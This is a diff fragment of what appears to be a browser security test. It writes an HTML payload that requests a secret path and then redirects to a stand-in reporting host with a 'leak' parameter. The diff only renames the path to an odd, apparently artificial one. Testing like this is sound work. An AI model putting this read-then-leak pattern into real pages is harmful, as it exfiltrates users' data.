@@ -8,7 +8,7 @@
       function (fileEntry) {
         fileEntry.createWriter(function (fileWriter) {
           var payload =
-            "<!doctype html><script>var req = new XMLHttpRequest(); req.onreadystatechange = function () { if (this.readyState == 4 && this.status == 200) { document.location.href = 'https://a.test/report/?leak=c1117687'; } }; req.open('GET', '/CSP/c1117687/secret', true); req.send();<\/script>";
+            "<!doctype html><script>var req = new XMLHttpRequest(); req.onreadystatechange = function () { if (this.readyState == 4 && this.status == 200) { document.location.href = 'https://a.test/report/?leak=c1117687'; } }; req.open('GET', '/GenAI-57-Examples-4o/c1117687/secret', true); req.send();<\/script>";
           var blob = new Blob([payload], { type: 'text/html' });
           fileWriter.write(blob);
         }, errorHandler);
